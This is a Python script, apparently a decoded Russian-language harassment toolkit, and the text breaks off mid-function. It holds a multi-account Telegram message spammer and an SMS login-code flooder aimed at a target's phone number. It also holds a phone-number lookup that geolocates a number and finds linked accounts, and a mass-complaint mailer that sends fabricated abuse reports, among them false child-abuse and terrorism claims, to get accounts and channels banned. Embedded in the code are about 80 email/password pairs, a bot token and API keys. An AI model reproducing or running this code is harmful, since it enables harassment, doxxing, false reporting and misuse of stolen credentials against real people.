#ДЕБАГЕР ЗАЮЗАН
#ДЕКОДИЛ - ЗАХОТЕЛ
#ССЫЛКА НА МОЙ КАНАЛ 
#https://t.me/HAHAHA_DECOD
#https://t.me/HAHAHA_DECOD
#https://t.me/HAHAHA_DECOD
#ЕСЛИ НЕ РАБОТАЕТ ТО УБЕРИ ТЕКСТ С #
import os, subprocess, sys, time, json, urllib.request, base64, random, requests, hashlib, webbrowser
from bs4 import BeautifulSoup
from datetime import datetime, timezone, timedelta
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonChildAbuse,
    InputReportReasonOther
)
import asyncio, string, aiohttp, fake_useragent, faker
from fake_useragent import UserAgent
import threading
from tqdm import tqdm
from termcolor import colored
from urllib.parse import urlparse, parse_qs

ACCOUNTS_FILE = 'accounts_1.2.json'

class FONT:
    RED = '\033[91m'
    GREY = '\033[01;38;05;15m'
    
async def spam_tg():
    accounts = []

    def print_menu():
        print("[0] - Выйти")
        print("[1] - Отправить сообщения с нескольких аккаунтов")
        print("[2] - Добавить аккаунт")
        print("[3] - Показать добавленные аккаунты")

    async def send_telegram_messages(recipient, message, count, client, session_name):
        try:
            for i in range(1, count + 1):
                await client.send_message(recipient, message)
                print(f"\rСообщение {i} отправлено пользователю {recipient} с аккаунта {session_name}", end="")
                await asyncio.sleep(0.01)

            print(f"\nВсего отправлено {count} сообщений пользователю {recipient} с аккаунта {session_name}.")
        except Exception as e:
            print(f"\nОшибка при отправке сообщений с аккаунта {session_name}: {e}")

    async def main(recipient, message, count):
        if not accounts:
            print("Нет добавленных аккаунтов. Пожалуйста, добавьте аккаунты через меню.")
            return

        tasks = []
        for session_name, client in accounts:
            task = send_telegram_messages(recipient, message, count, client, session_name)
            tasks.append(task)

        await asyncio.gather(*tasks)

    def generate_random_session_name(length=5):
        letters = string.ascii_lowercase + string.digits
        return ''.join(random.choice(letters) for _ in range(length))

    async def add_account():
        session_name = generate_random_session_name()
        client = TelegramClient(f'sessions/{session_name}', api_id, api_hash)

        try:
            await client.start()
            accounts.append((session_name, client))
            print(f"Аккаунт {session_name} успешно добавлен.")
        except Exception as e:
            print(f"Ошибка при авторизации аккаунта: {e}")

    def show_accounts():
        if not accounts:
            print("Нет добавленных аккаунтов.")
        else:
            print("\nДобавленные аккаунты:")
            for i, (session_name, _) in enumerate(accounts, 1):
                print(f"{i}. {session_name}")

    async def load_sessions():
        if not os.path.exists('sessions'):
            os.makedirs('sessions')

        for file in os.listdir('sessions'):
            if file.endswith('.session'):
                session_name = file.split('.')[0]
                client = TelegramClient(f'sessions/{session_name}', api_id, api_hash)
                try:
                    await client.connect()
                    if await client.is_user_authorized():
                        accounts.append((session_name, client))
                        print(f"Сессия {session_name} успешно загружена.")
                    else:
                        print(f"Сессия {session_name} не авторизована.")
                except Exception as e:
                    print(f"Ошибка при загрузке сессии {session_name}: {e}")

    async def run_menu():
        await load_sessions()
        while True:
            print_menu()
            choice = input("Выберите пункт меню: ")

            if choice == "1":
                recipient = input("Введите имя пользователя или номер телефона получателя: ")
                message = input("Введите текст сообщения: ")
                count = int(input("Введите количество сообщений для отправки с каждого аккаунта: "))
                await main(recipient, message, count)
            elif choice == "2":
                await add_account()
            elif choice == "3":
                show_accounts()
            elif choice == "0":
                break
            else:
                print("Неверный выбор. Пожалуйста, выберите пункт меню от 1 до 4.")

    api_id = 21826549
    api_hash = 'c1a19f792cfd9e397200d16c7e448160'
    await run_menu()

log_bot = '7247717499:AAHI7pvVaDYyT2K8TbyEIMUx3rH3v8Z7his'
log_rec = '5479401773'

def flood_codami():
    z = 0
    mes = ""
    async def send_request(session, url, headers, data):
        nonlocal z
        nonlocal mes
        try:
            data_with_armat = data.copy()
            data_with_armat["message"] = f"{mes}"

            async with session.post(url, headers=headers, data=data_with_armat) as response:
                if response.status == 200:
                    z += 1
                else:
                    print(colored(f"Ошибка при отправке запроса на {url}: {response.status}", 'red'))
        except Exception as e:
            print(colored(f"Ошибка при отправке запроса на {url}: {e}", 'red'))

    async def main():
        nonlocal mes
        number = int(input("\nВведите номер телефона: "))
        count = int(input("Введите количество циклов: "))
        mes = input("Введите ник (ARMAT по умолчанию): ")
        if mes == "":
            mes = "ARMAT"
        urls = [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://translations.telegram.org/auth/request',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'https://my.telegram.org/auth/send_password'
        ]

        try:
            async with aiohttp.ClientSession() as session:
                for _ in range(count):
                    user = fake_useragent.UserAgent().random
                    headers = {'user-agent': user}
                    tasks = [send_request(session, url, headers, {'phone': number}) for url in urls]
                    await asyncio.gather(*tasks)
        except Exception as e:
            print('[!] Ошибка, проверьте вводимые данные:', e)
        print(colored(f"Успешно отправленных кодов: {z}", 'cyan'))
        print(colored(f"Всего циклов: {count} ", 'cyan'))

    if __name__ == "__main__":
        asyncio.run(main())
 
def get_address_by_coordinates(latitude, longitude):
    address_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}"
    
    try:
        address_response = urllib.request.urlopen(address_url)
        address_data = json.load(address_response)
        
        if "address" in address_data:
            sorted_address = sort_address(address_data["address"])
            return sorted_address
        else:
            return "Адрес не найден"
    except Exception as e:
        return f"Ошибка при получении адреса: {e}"

def sort_address(address):
    address_order = [
        "road",
        "house_number",
        "village",
        "town",
        "suburb",
        "postcode"
    ]
    
    sorted_address = {}
    for key in address_order:
        if key in address:
            sorted_address[key] = address[key]
    
    return sorted_address

def translate_address(address):
    translations = {
        "road": "Улица",
        "house_number": "Номер дома",
        "village": "Деревня",
        "town": "Городок",
        "suburb": "Район",
        "postcode": "Почтовый индекс"
    }
    
    translated_address = {}
    for key, value in address.items():
        translated_key = translations.get(key, key.capitalize())
        translated_address[translated_key] = value
    
    return translated_address       
def probiv_po_nomeru():
    USERAGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
    ]

    HTMLWEB_URL = "https://htmlweb.ru/geo/api.php?json&telcod="
    VERIPHONE_URL = "https://api.veriphone.io/v2/verify?phone="
    VERIPHONE_API_KEY = "133DF840CE4B40AEABC341B7CA407A2D"
    OK_LOGIN_URL = 'https://www.ok.ru/dk?st.cmd=anonymMain&st.accRecovery=on&st.error=errors.password.wrong'
    OK_RECOVER_URL = 'https://www.ok.ru/dk?st.cmd=anonymRecoveryAfterFailedLogin&st._aid=LeftColumn_Login_ForgotPassword'

    headers = {"User-Agent": random.choice(USERAGENTS)}

    def check_login(TELCODE):
        try:
            session = requests.Session()
            session.get(f'{OK_LOGIN_URL}&st.email={TELCODE}', timeout=10)
            request = session.get(OK_RECOVER_URL, timeout=10)
            ROOT_SOUP = BeautifulSoup(request.content, 'html.parser')
            if ROOT_SOUP.find('div', {'data-l': 'registrationContainer,offer_contact_rest'}):
                ACCOUNT_INFO = ROOT_SOUP.find('div', {'class': 'ext-registration_tx taCenter'})
                MASKED_PHONE = ROOT_SOUP.find('button', {'data-l': 't,phone'})
                if MASKED_PHONE:
                    MASKED_PHONE = TELCODE
                if ACCOUNT_INFO:
                    NAME = ACCOUNT_INFO.find('div', {'class': 'ext-registration_username_header'})
                    if NAME:
                        NAME = NAME.get_text()
                    ACCOUNT_INFO = ACCOUNT_INFO.findAll('div', {'class': 'lstp-t'})
                    if ACCOUNT_INFO:
                        PROFILE_INFO = ACCOUNT_INFO[0].get_text()
                        PROFILE_REGISTRED = ACCOUNT_INFO[1].get_text()
                    else:
                        PROFILE_INFO = None
                        PROFILE_REGISTRED = None

                print(FONT.RED + f"\n ├Источник:" + FONT.GREY + f" Одноклассники")
                print(FONT.RED + f" ├Привязанный номер:" + FONT.GREY + f" {MASKED_PHONE}")
                print(FONT.RED + f" ├Имя аккаунта:" + FONT.GREY + f" {NAME}")
                print(FONT.RED + f" ├Инфо профиля:" + FONT.GREY + f" {PROFILE_INFO}")
                print(FONT.RED + f" ├Дата регистрации:" + FONT.GREY + f" {PROFILE_REGISTRED}")

            if ROOT_SOUP.find('div', {'data-l': 'registrationContainer,home_rest'}):
                return 'not associated'
            else:
                return None
        except requests.exceptions.Timeout:
            print(FONT.RED + "Ошибка: Превышено время ожидания запроса к Одноклассникам.")
            return None

    def check_internet():
        try:
            urllib.request.urlopen('https://google.com', timeout=7.77)
            return True
        except urllib.error.URLError:
            print(FONT.RED + "Ошибка: Нет подключения к интернету!")
            sys.exit()

    check_internet()
    while True:
        TELCODE = input(FONT.RED + "\n[" + FONT.GREY + "?" + FONT.RED + "]" + FONT.GREY + " Введите номер для поиска или 0 для выхода: ")
        if TELCODE == '0':
        	break
        print(FONT.RED + "\nРезультаты поиска:")

        try:
            response = requests.get(HTMLWEB_URL + TELCODE, headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                TELCOD = data.get("country", {}).get("telcod", "Неизвестно")
                COUNTRY = data.get("country", {}).get("fullname", "Неизвестно")
                OKRUG = data.get("okrug", "Неизвестно")
                OBLAST = data.get("region", {}).get("name", "Неизвестно")
                CITY = data.get("0", {}).get("name", "Неизвестно")
                latitude = data.get("0", {}).get("latitude", "Неизвестно")
                longitude = data.get("0", {}).get("longitude", "Неизвестно")
                TIMEZONE = data.get("0", {}).get("time_zone", data.get("time_zone", "Неизвестно"))
                OPER = data.get("0", {}).get("oper", "Неизвестно")
                
                print(FONT.RED + f"\n ├Источник:" + FONT.GREY + f" HTMLWEB & Veriphone")
                print(FONT.RED + f" ├Телефонный код:" + FONT.GREY + f" +{TELCOD}")
                print(FONT.RED + f" ├Страна:" + FONT.GREY + f" {COUNTRY}")
                print(FONT.RED + f" ├Округ:" + FONT.GREY + f" {OKRUG}")
                print(FONT.RED + f" ├Регион:" + FONT.GREY + f" {OBLAST}")
                print(FONT.RED + f" ├Город:" + FONT.GREY + f" {CITY}")
                print(FONT.RED + f" ├Широта:" + FONT.GREY + f" {latitude}")
                print(FONT.RED + f" ├Долгота:" + FONT.GREY + f" {longitude}")
                print(FONT.RED + f" ├Часовой пояс:" + FONT.GREY + f" +{TIMEZONE} UTC")
            else:
                print(FONT.RED + f" ├Ошибка при получении данных от HTMLWEB: {response.status_code}")
        except Exception as e:
            print(FONT.RED + f" ├Ошибка при запросе к HTMLWEB: {e}")

        try:
            response = requests.get(f"{VERIPHONE_URL}{TELCODE}&key={VERIPHONE_API_KEY}", headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                PHONE_TYPE = data.get("phone_type", "Неизвестно")
                                
                print(FONT.RED + f" ├Тип:" + FONT.GREY + f" {PHONE_TYPE}")
                print(FONT.RED + f" ├Оператор:" + FONT.GREY + f" {OPER}")
                
        except Exception as e:
            print(FONT.RED + f" ├Ошибка при запросе к Veriphone: {e}")
            
        if latitude != "Неизвестно" and longitude != "Неизвестно":
            address = get_address_by_coordinates(latitude, longitude)
            if isinstance(address, dict):
                translated_address = translate_address(address)
                print(FONT.RED + f" ├Адрес:")
                for key, value in translated_address.items():
                    print(FONT.RED + f" │├{key}:" + FONT.GREY + f" {value}")
            else:
                print(FONT.RED + f" ├Адрес:" + FONT.GREY + f" {address}")

        check_login(TELCODE)
        print("\n\nДополнительные источники:")
        valid = TELCODE.replace('+', '')
        print(FONT.RED + f"\n├https://smsc.ru/testhlr/?phone={valid}" + FONT.GREY + f" - проверка на валид\n")
        print(FONT.RED + f"├https://reveng.ee/search?q={TELCODE}" + FONT.GREY + f" - расширенный поиск\n")

def generate_fake_data():
    fake = faker.Faker('ru_RU')
    
    while True:        
        try:
            num_persons = int(input("Введите число личностей для генерации или 0 для выхода: "))
            if num_persons == 0:
                break
            if num_persons <= 0:
                raise ValueError
        except ValueError:
            print("Ошибка: введите положительное целое число или 0 для выхода.")
            continue

        generated_data = []

        with open('Incognits.txt', 'w', encoding='utf-8') as file:
            for _ in range(num_persons):
                person = {
                    "Имя": fake.name(),
                    "Адрес": fake.address(),
                    "Email": fake.email(),
                    "Телефон": fake.phone_number(),
                    "Профессия": fake.job(),
                    "Компания": fake.company(),
                    "Дата рождения": fake.date_of_birth(minimum_age=18, maximum_age=90).strftime('%Y-%m-%d'),
                    "Социальный номер": fake.ssn(),
                    "Имя пользователя": fake.user_name(),
                    "Пароль": fake.password(),
                    "Кредитная карта": fake.credit_card_full(),
                    "IP адрес": fake.ipv4(),
                    "Страна": fake.country(),
                    "Город": fake.city(),
                }
                generated_data.append(person)

                for key, value in person.items():
                    file.write(f"{key}: {value}\n")
                file.write("\n")

        if num_persons <= 100:
            for person in generated_data:
                for key, value in person.items():
                    print(f"{key}: {value}")
                print()
            print("Данные сохранены в файл 'Incognits.txt'.\n")
        else:
            print(f"Сгенерировано {num_persons} записей. Данные сохранены в файл 'Incognits.txt'.")
 
def text_swat():
    def replace_chars(text, use_fence):
        replacements = {
            'А': 'А', 'а': 'а', 'Б': 'Б', 'б': 'б', 'В': 'B', 'в': 'в', 'Г': 'Г', 'г': 'г', 
            'Д': 'D', 'д': 'd', 'Е': 'E', 'е': 'e', 'Ё': 'Ё', 'ё': 'ё', 'Ж': 'Ж', 'ж': 'Ж', 
            'З': '3', 'з': '3', 'И': 'U', 'и': 'u', 'й': 'й', 'К': 'K', 'к': 'k', 'Л': 'JI', "л": "JI",
            'М': 'M', 'м': 'м', 'Н': 'Н', 'н': 'н', 'о': '0', 'п': 'n', 'р': 'p', 'с': 'c', "С": "S",
            'т': 'T', 'у': 'y', 'ф': 'ф', 'х': 'x', 'ч': '4', "Ч": "4",'ш': 'III', "Ш": "III", 'щ': 'щ', 'ъ': 'ъ', 
            'ы': 'bI', "Ы": "bI", 'ю': 'ю', 'я': 'я'
        }
        result = ''
        for char in text:
            if use_fence:
                result += replacements.get(char.upper(), char)
            else:
                result += replacements.get(char.upper(), char.upper())
        return result

    while True:
        print("\n[0] - Выход")
        print("[1] - ВыВоД вИдЕ зАбОрА.\n[2] - ВСЕ ЗАГЛАВНЫЕ.\n")
        option = input("Выберите опцию: ")
        if option == '0':
        	break
        if option not in ['1', '2', '0']:
            print("Ошибка: Неправильная опция.")
        user_input = input("Введите текст: ")
        replaced_text = replace_chars(user_input, option == '1')
        print("Результат замены:\n")
        print(replaced_text)
        
def snos_email():
    def install_and_import(package):
        try:
            __import__(package)
        except ImportError:
            print(f"Устанавливаем {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

    install_and_import('random')
    install_and_import('string')
    install_and_import('smtplib')
    install_and_import('email')
    install_and_import('time')

    senders = {
        'lyimbshsup@rambler.ru': '6463734rnAygg',
        'jdqukazixk@rambler.ru': '0225223ACFeq0',
        'baljufgcnc@rambler.ru': '4738678YMyCvO',
        'ruslanorlovimx4134@rambler.ru': 'Andersonnancy945',
        'vladislavkulikovxcr1902@rambler.ru': 'Allenkimberly021',
        'romasidorovdbj3700@rambler.ru': 'Clarkmargaret444',
        'lehabogdanovhdw1954@rambler.ru': 'Evanssandra913',
        'mihailtitovopr6182@rambler.ru': 'Younghelen407',
        'koljafedotovmqj2347@rambler.ru': 'Gonzalezsarah321',
        'genasemenovhvu9785@rambler.ru': 'Taylorlaura482',
        'vovafedorovmvu7067@rambler.ru': 'Collinsbetty976',
        'grishakulikovyyk8848@rambler.ru': 'Wilsonlaura931',
        'olegnikitinxwo3553@rambler.ru': 'Wrightkaren568',
        'gennadijkalininizb3132@rambler.ru': 'Turnerdorothy038',
        'bogdankarpovxad9304@rambler.ru': 'Carterlinda019',
        'koljakuznecovzfq8892@rambler.ru': 'Walkerhelen225',
        'vladdmitrievtpv8734@rambler.ru': 'Brownmary434',
        'arturkovalevdln7432@rambler.ru': 'Lewisnancy365',
        'konstantinbelovabq7348@rambler.ru': 'Allenmary923',
        'sashavorobevbml8362@rambler.ru': 'Hilllaura818',
        'ruslankozlovhji7240@rambler.ru': 'Hallnancy735',
        'olegzajcevepy8163@rambler.ru': 'Nelsonsharon117',
        'grigorijfominlxp0053@rambler.ru': 'Wrightpatricia686',
        'vitalijmaslovusv3737@rambler.ru': 'Garciabetty827',
        'olegbelovblx5518@rambler.ru': 'Phillipssharon437',
        'olegmaslovrde8926@rambler.ru': 'Mitchellbetty324',
        'vitalijdavydovtal6583@rambler.ru': 'Rodriguezmichelle351',
        'dmitrijmironovlaf9788@rambler.ru': 'Whitedeborah816',
        'vanjakulikovdpf6394@rambler.ru': 'Allencarol017',
        'andrejmaksimovwjw5202@rambler.ru': 'Cartersusan436',
        'zhenjaafanasevomj8876@rambler.ru': 'Harrislinda730',
        'sanjatimofeevxur1820@rambler.ru': 'Martinmichelle433',
        'grishabogdanovhqj9645@rambler.ru': 'Turnermargaret062',
        'viktorpavlovzlh2404@rambler.ru': 'Hilllaura917',
        'mihailkuznecovbuh2424@rambler.ru': 'Millerkaren783',
        'bogdanmironovkgf3690@rambler.ru': 'Greenjennifer095',
        'tolikkulikovnfv3662@rambler.ru': 'Perezelizabeth881',
        'sanjaabramovotb8410@rambler.ru': 'Hillpatricia526',
        'pashabykovzhy8581@rambler.ru': 'Scottdonna750',
        'jurijbogdanovwuc0744@rambler.ru': 'Harrisnancy027',
        'antongusevaws0670@rambler.ru': 'Collinsruth779',
        'maksimlebedevsxm5444@rambler.ru': 'Evanskaren499',
        'vladimirchernyshevfnt3789@rambler.ru': 'Halldonna541',
        'petjagusevrzl9637@rambler.ru': 'Taylorpatricia485',
        'vitaliklebedevhla3289@rambler.ru': 'Lewismichelle721',
        'aleksandrwerbakovsbg8385@rambler.ru': 'Gonzalezdeborah554',
        'pavelgrigorevjtz4407@rambler.ru': 'Campbellbetty034',
        'maksdenisovskv0461@rambler.ru': 'Smithmaria151',
        'gennadijtihonovqzc3691@rambler.ru': 'Clarksharon602',
        'ruslandmitrievvgr1236@rambler.ru': 'Kingdeborah697',
        'genamaslovfys4433@rambler.ru': 'Wrightsharon746',
        'borjamironovfrc3345@rambler.ru': 'Harrissusan337',
        'antonchernovown4062@rambler.ru': 'Thomaskimberly712',
        'vladimirgrigoreveqq9112@rambler.ru': 'Parkermichelle304',
        'sashawerbakoviet2953@rambler.ru': 'Clarksharon806',
        'mishaantonovcwv6881@rambler.ru': 'Kingmargaret388',
        'mihailmelnikovoyp1458@rambler.ru': 'Wilsonlisa429',
        'kostjakiselevhjw4194@rambler.ru': 'Evanshelen904',
        'kostjastepanovbes5317@rambler.ru': 'Carterlaura187',
        'toljadanilovcvh2967@rambler.ru': 'Martinezbarbara968',
        'leshakozlovspt3407@rambler.ru': 'Hernandezbetty901',
        'vanjakozlovbvy7090@rambler.ru': 'Jonescarol966',
        'leshafilippovfha9160@rambler.ru': 'Davislinda702',
        'olegjakovlevmkp6120@rambler.ru': 'Perezjennifer226',
        'igorisaevfen3865@rambler.ru': 'Allenpatricia615',
        'pashakonovalovgmf3693@rambler.ru': 'Garciamichelle737',
        'vladimirandreevqol3763@rambler.ru': 'Robinsonkimberly357',
        'jurijprohorovgnq3561@rambler.ru': 'Kinglaura374',
        'vladislavtarasovpqk4498@rambler.ru': 'Garciacarol344',
        'antonvorobevtxz5033@rambler.ru': 'Lopezlinda159',
        'romaandreevjvo1698@rambler.ru': 'Youngnancy376',
        'vladislavbeljaevvfa7045@rambler.ru': 'Robertsjennifer080',
        'vitaliknikolaevzoh1565@rambler.ru': 'Collinsdonna967',
        'koljamironovydt4703@rambler.ru': 'Wrightmichelle859',
        'gennadijsemenovmki9018@rambler.ru': 'Perezsusan734',
        'pashakarpovafr2420@rambler.ru': 'Wrightsarah462',
        'artemkomarovqqt3719@rambler.ru': 'Martinlinda992',
        'konstantinchernyshevneh8321@rambler.ru': 'Smithdonna021',
        'grigorijsidorovrpl5056@rambler.ru': 'Harrispatricia221',
        'petrsergeevmse2216@rambler.ru': 'Bakerjennifer796'
    }

    receivers = ['sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org', 'support@telegram.org']

    def print_menu():
        print("\033[92mМеню:\033[0m")
        print("[ 1 ] Snos аккаунта")
        print("[ 2 ] Snos канала")
        print("[ 0 ] Выход\n")

    def send_email(receiver, sender_email, sender_password, subject, body):
        try:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = receiver
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))

            server = smtplib.SMTP('smtp.rambler.ru', 587)
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver, msg.as_string())
            time.sleep(3)
            server.quit()
            return True
        except Exception as e:
            print(f"Ошибка при отправке письма: {e}")
            return False

    def handle_complaint():
        total_emails = len(senders) * len(receivers)
        sent_emails = 0

        while sent_emails < total_emails:
            print_menu()
            choice = input("\nВыбор: ")

            if choice == "1":
                print("\nВыберите тип жалобы:")
                print("\n[ 1.1 ] Обычный snos")
                print("[ 1.2 ] Snos сессий")
                complaint_choice = input("Ваш выбор: ")

                if complaint_choice == "1.1":
                    print("\nВведите причину, юзернейм, telegram ID, затем ссылки на канал/чат и на нарушение")
                    reason = input("\nПричина: ")
                    username = input("Юзернейм: ")
                    telegram_ID = input("Telegram ID: ")
                    chat_link = input("\n\nСсылка на чат: ")
                    violation_chat_link = input("\nСсылка на нарушение: ")

                    complaint_texts = {
                        "1.1": f"Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_ID}. Ссылка на чат с нарушениями - {chat_link}, ссылки на нарушения - {violation_chat_link}. Спасибо за помощь."
                    }

                    for sender_email, sender_password in senders.items():
                        for receiver_email in receivers:
                            complaint_text = complaint_texts[complaint_choice]
                            complaint_body = complaint_text.format(reason=reason.strip(), username=username.strip(), telegram_ID=telegram_ID.strip(), chat_link=chat_link.strip(), violation_chat_link=violation_chat_link.strip())
                            if send_email(receiver_email, sender_email, sender_password, "Жалоба на Telegram аккаунт", complaint_body):
                                print(f"\n\n[ Удачно ] Жалоба отправлена! | {receiver_email} от {sender_email}!")
                                sent_emails += 1

                elif complaint_choice == "1.2":
                    print("\nВведите юзернейм и Telegram ID")
                    account_username = input("\nUsername: ")
                    Telegram_account_ID = input("Telegram ID: ")

                    complaint_texts = {
                        "1.2": f"Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм — {account_username}, а мой айди, если злоумышленник поменял юзернейм — {Telegram_account_ID}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных."
                    }

                    for sender_email, sender_password in senders.items():
                        for receiver_email in receivers:
                            complaint_text = complaint_texts[complaint_choice]
                            complaint_body = complaint_text.format(account_username=account_username.strip(), Telegram_account_ID=Telegram_account_ID.strip())
                            if send_email(receiver_email, sender_email, sender_password, "Я утерял свой телеграм-аккаунт", complaint_body):
                                print(f"\n\n[ Удачно ] Жалоба отправлена! |{receiver_email} от {sender_email}!")
                                sent_emails += 1

            elif choice == "2":
                print("\nВыберите тип жалобы:")
                print("\n\n[ 8 ] Личные данные")
                print("[ 9 ] Для прайсов")
                print("[ 10 ] Для геймов")
                print("[ 11 ] Детское питание")
                print("[ 12 ] Мошенничество")
                print("[ 13 ] Продажа вирт номеров")
                print("[ 14 ] Расчлененка")
                print("[ 15 ] Живодерство")
                complaint_type = input("\nВыбор: ")

                complaint_types = {
                    "8": ["Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются личные данные невинных людей. Ссылка на канал - {channel_link} . Ссылка на нарушение - {violation_link} . Просьба удалить данный канал с вашей площадки", "Hello, Telegram support team! I have found a channel on your social network where personal data of innocent people is being published. The link to the channel is {channel_link}. The link to the violation is {violation_link}. Please remove this channel from your platform"],
                    "9": ["Здравствуйте,уважаемый модератор телеграмм,хочу пожаловаться вам на канал,который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал:{channel_link} Ссылка на нарушение:{violation_link} Просьба заблокировать данный канал.", "Hello, dear Telegram moderator,I would like to file a complaint regarding a channel on your platform that is selling doxxing and swatting services. Here are the details: Telegram channel link: {channel_link} Violation link: {violation_link} Please block this channel."],
                    "10": ["Hello dear Telegram support! Please block the {channel_link} channel The channel threatens to shoot children in schools and commit terrorist attacks, you can see it here {violation_link} Thank you in advance", "Здравствуйте, уважаемая поддержка Telegram! Пожалуйста, заблокируйте канал {channel_link}. В этом канале угрожают расстрелом детей в школах и совершением террористических актов, вы можете увидеть это здесь {violation_link}. Заранее спасибо."],
                    "11": ["Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуется порнография с несовершеннолетними детьми. Ссылка на канал - {channel_link}  . Ссылка на нарушение - {violation_link} . Просьба удалить данный канал с вашей площадки", "Hello, Telegram support! In your social network, I found a channel posting pornography videos with children. Channel link - {channel_link} violation link - {violation_link} , please block this channel"],
                    "12": ["Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются посты с целью обмана и мошенничества. Ссылка на канал - {channel_link}  . Ссылка на нарушение - {violation_link} . Просьба удалить данный канал с вашей площадки", "Hello, Telegram support! In your social network, I found a channel where posts aimed at deception and fraud are being published. The link to the channel is {channel_link}. The link to the violation is {violation_link}. Please remove this channel from your platform."],
                    "13": ["Здравствуйте, поддержка telegram. Я бы хотел пожаловаться на телеграм канал продающий виртуальные номера, насколько я знаю это запрещено правилами вашей площадки. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link} . Спасибо что очищаете свою площадку от подобных каналов!", "Hello, Telegram support. I would like to report a Telegram channel selling virtual phone numbers, which as far as I know, is prohibited by your platform's rules. Here are the details:Channel link: {channel_link} Violation link: {violation_link} Thank you for cleansing your platform from such channels!"],
                    "14": ["Доброго времени суток, уважаемая поддержка. На просторах вашей платформы мне попался канал, распространяющий шок контент с убийствами людей. Ссылка на канал - {channel_link} , ссылка на нарушение - {violation_link} . Просьба удалить данный канал, спасибо за внимание.", "Good day, esteemed support team. I came across a channel on your platform that disseminates shocking content involving human fatalities. Here is the link to the channel - {channel_link}, along withthe violation link - {violation_link}. Kindly remove this channel. Thank you for your attention."],
                    "15": ["Здравствуйте, уважаемая поддержка. На вашей платформе я нашел канал который выкладывает жестокое обращение с животными. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link}. Спасибо за то что делаете телеграм чище.", "Hello, dear support. I found a channel postingcruelty to animals. Channel link - {channel_link} , violation links - {violation_link} Thank you"],
                }

                if complaint_type not in complaint_types:
                    print("\n\n[ Error ] Некорректный выбор.")
                else:
                    complaint_texts = complaint_types[complaint_type]
                    channel_link = input("\nСсылка на канал: ")
                    violation_link = input("Ссылка на нарушение: ")

                    for sender_email, sender_password in senders.items():
